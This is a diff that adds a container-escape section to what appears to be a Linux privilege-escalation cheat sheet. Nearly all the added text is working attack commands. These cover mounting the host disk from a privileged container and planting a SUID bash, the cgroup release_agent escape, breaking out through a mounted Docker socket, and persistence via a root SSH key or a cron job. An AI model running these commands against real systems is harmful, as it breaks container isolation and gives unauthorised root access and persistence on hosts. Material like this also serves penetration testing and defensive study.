@@ -158,6 +158,73 @@ id | grep docker
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
+## Container Escape (from inside a container)
+
+```bash
+# Am I in a container?
+cat /proc/1/cgroup | grep -i docker
+ls /.dockerenv
+```
+
+### Privileged container — host filesystem accessible
+
+```bash
+# Check: docker inspect <id> → "Privileged": true
+# Or: ls /sys/kernel/security/apparmor (mounted = likely privileged)
+cat /proc/self/status | grep CapEff   # all 1s = full capabilities
+
+# Mount host disk and chroot
+fdisk -l                        # find host disk (e.g. /dev/sda1)
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+chroot /mnt/host /bin/bash      # now on host filesystem
+
+# Add SUID bash on host
+cp /mnt/host/bin/bash /mnt/host/tmp/rootbash
+chmod +s /mnt/host/tmp/rootbash
+# Then on host: /tmp/rootbash -p → root shell
+```
+
+### cap_sys_admin — mount namespace escape
+
+```bash
+# Check capability
+cat /proc/self/status | grep CapEff
+capsh --decode=<hex_value>      # decode capabilities
+
+# If cap_sys_admin present — mount host via cgroups v1
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd && echo "chmod +s /bin/bash" >> /cmd && chmod +x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+# Wait, then: bash -p → root
+```
+
+### Docker socket escape (socket mounted in container)
+
+```bash
+# Check
+ls -la /var/run/docker.sock    # exists and accessible?
+
+# Escape via new privileged container with host mount
+docker -H unix:///var/run/docker.sock run -it \
+  -v /:/host --privileged alpine chroot /host sh
+
+# Or enumerate the host's containers
+docker -H unix:///var/run/docker.sock ps -a
+```
+
+### Writable hostPath mount
+
+```bash
+# Check mounted paths
+cat /proc/self/mounts | grep -v "cgroup\|proc\|sys\|dev"
+# If host path is mounted writable:
+# Write SSH key to host's /root/.ssh/authorized_keys
+# Write cron job to /etc/cron.d/
+```
+
 ## LXD / LXC Group
 
 ```bash
